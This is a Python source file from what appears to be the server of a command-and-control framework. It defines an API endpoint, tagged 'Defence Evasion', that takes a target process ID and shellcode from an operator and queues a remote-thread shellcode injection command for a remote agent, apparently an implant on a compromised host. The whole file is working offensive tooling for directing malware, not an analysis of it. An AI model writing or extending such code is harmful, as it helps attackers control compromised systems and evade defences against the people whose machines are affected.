from uuid import UUID
from darkscryc2server.Models.schemas import GenAction
from application.services.view_base import ApiRouteV2
from application.views.api.Schemas.Modules.Evasion.injection import InjectRemoteThreadResults
from darkscryc2server.Models.schemas import CommandIdentifiers
from django.shortcuts import aget_object_or_404
from application.models import Agent
from application.views.api.Schemas.general import TaskOut
from application.shortcuts import make_task

prefix_with_agent = "/agents/{agent_id}/modules/evasion/injection"
class ProcessCollection(ApiRouteV2):
    def __init__(self, tags = ['Defence Evasion']):
        super().__init__(tags=tags, prefix=prefix_with_agent)
        self.register_routes()

    
    async def inject_shellcode_remote_thread(self, request, agent_id:UUID, payload:InjectRemoteThreadResults, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = GenAction(
            action=CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD,
            pid=payload.pid,
            shellcode=payload.shellcode
        ).xml()
        job = await make_task(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD
        )
        return TaskOut(task_id=job.job_id)

    
    def register_routes(self):
        self.register_route(
            path="/remote_thread_injection",
            methods=["POST"], 
            view_func=self.inject_shellcode_remote_thread, 
            response={200:TaskOut},
            summary="Inject shell code into running process via remote thread"
        )